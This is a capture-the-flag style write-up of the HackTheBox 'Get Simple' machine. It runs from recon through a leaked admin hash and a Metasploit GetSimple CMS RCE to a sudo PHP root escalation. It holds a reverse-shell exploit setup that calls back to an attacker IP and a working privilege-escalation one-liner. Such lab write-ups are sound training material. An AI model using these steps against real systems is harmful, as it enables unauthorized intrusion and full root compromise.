This write-up covers the exploitation of the **Get Simple** machine from HackTheBox. The attack path starts with extracting hashed credentials from an exposed XML file, exploiting a known Remote Code Execution (RCE) in GetSimple CMS to gain an initial shell, and subsequently abusing a `sudo` misconfiguration to achieve root access.

## Overview

- **IP Address:** 10.129.42.249
- **CMS:** GetSimple CMS 3.3.15

## Reconnaissance

### Port Scanning

We begin by scanning the target using Nmap to discover open ports and services, utilizing the `http-enum` script to perform initial web enumeration:

```bash
nmap -sV --script=http-enum 10.129.42.249
```

The scan reveals two open ports:
- **22/tcp (SSH):** OpenSSH 8.2p1 (Ubuntu)
- **80/tcp (HTTP):** Apache httpd 2.4.41 (Ubuntu)

### Web Enumeration

The `http-enum` script identifies several interesting directories on the web server:
- `/admin/`
- `/backups/`
- `/robots.txt`
- `/data/`

Checking `/robots.txt`, we confirm that the `/admin/` path is explicitly disallowed for crawlers. 

Further inspection of the `/data/` directory reveals that directory listing is enabled. This allows us to browse the contents freely. Navigating to `/data/users/`, we discover a file named `admin.xml`. Retrieving this file via `curl` exposes sensitive information:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<item>
  <USR>admin</USR>
  <NAME/>
  <PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
  <EMAIL>admin@gettingstarted.com</EMAIL>
  <HTMLEDITOR>1</HTMLEDITOR>
  <TIMEZONE/>
  <LANG>en_US</LANG>
</item>
```

## Vulnerability Discovery & Initial Access

### Credential Harvesting

The `admin.xml` file leaks a SHA-1 hashed password for the `admin` user: `d033e22ae348aeb5660fc2140aec35850c4da997`. 
Using open-source hash cracking services (such as CrackStation), we successfully reverse the hash to its plaintext equivalent: `admin`.

**Credentials Compromised:** `admin:admin`

### Exploitation (GetSimple CMS 3.3.15)

By inspecting cache files (e.g., `/data/cache/2a4c6447379fba09620ba05582eb61af.txt`) and utilizing `WhatWeb`, we identify the underlying software as **GetSimple CMS 3.3.15**.

Searching for exploits related to this version (`searchsploit`), we find a known Remote Code Execution (RCE) vulnerability. We opt to use the corresponding Metasploit module (`exploit/multi/http/getsimplecms_unauth_code_exec`).

We configure the exploit in Metasploit as follows:

```bash
msf > use exploit/multi/http/getsimplecms_unauth_code_exec
msf exploit(...) > set lhost 10.10.16.226
msf exploit(...) > set rhosts 10.129.42.249
msf exploit(...) > set targeturi /
msf exploit(...) > set payload generic/shell_reverse_tcp
msf exploit(...) > exploit
```
*(Note: An initial attempt targeting `/admin` failed. Adjusting the `targeturi` to the root directory `/` yielded a successful connection.)*

The exploit executes successfully, and we receive a reverse shell as the `www-data` user. We immediately upgrade the shell to a fully interactive pseudo-TTY using Python.

## Privilege Escalation

With local access established, we begin enumerating the system for privilege escalation vectors. We use automated tools (like `linpeas.sh` or `LinEnum`) and manual checks.

Running `sudo -l` reveals a critical misconfiguration:

```bash
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

The `www-data` user is permitted to execute the `php` binary as `root` without supplying a password.

### Root Exploitation

We reference GTFOBins for the `php` binary to find a method to abuse this `sudo` privilege. We can use PHP's `system()` function to spawn a shell directly:

```bash
sudo php -r 'system("/bin/sh -i");'
```

Upon executing this command, we are dropped into a shell with root privileges:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusion

The Get Simple machine serves as a reminder of the dangers of directory listing and storing sensitive files (like XML configurations) in publicly accessible directories. These misconfigurations allowed us to easily harvest credentials, leading to RCE through an outdated CMS. Finally, granting unrestricted `sudo` access to powerful binaries like PHP allows for trivial privilege escalation.